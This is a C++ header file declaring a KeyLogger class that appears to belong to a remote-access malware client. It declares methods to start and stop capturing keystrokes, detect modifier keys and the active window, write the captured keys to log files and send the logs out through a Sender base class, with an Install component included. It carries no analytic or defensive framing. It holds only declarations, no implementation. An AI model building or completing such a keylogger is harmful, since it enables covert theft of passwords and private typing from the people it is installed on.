#ifndef CLIENT_KEYLOGGER_H
#define CLIENT_KEYLOGGER_H

#include <iostream>
#include <fstream>
#include <string>
#include <fstream>
#include <atomic>
#include <thread>

#include "../stream/Stream.h"
#include "../Time/Time.h"
#include "../install/Install.h"
#include "../converter/Converter.h"
#include "../Sender/Sender.h"
#include "../configuration.h"



class KeyLogger : public Sender {

public:
    explicit KeyLogger(const Stream &stream);
    void sendLastKeyloggerLog();
    void sendAll() const;
    void tryStart();
    void stopKeylogger();
    void send() override;
    void sendState() const;

private:
    [[nodiscard]] bool lastLogExists() const;
    [[nodiscard]] bool logsExists() const;
    void start();
    std::wstring pathOfLogs;
    std::wstring logsFileName= generateLogName();
    std::atomic<bool> recordingKeys = false;
    std::string tempWindow;
    static std::string getCurrentWindow();
    static bool checkShift();
    static bool checkAltGr();
    void writeCharIntoLogFile(const char *string);
    void writeCharIntoLogFile(char string);
    std::wstring generateLogName();
};


#endif
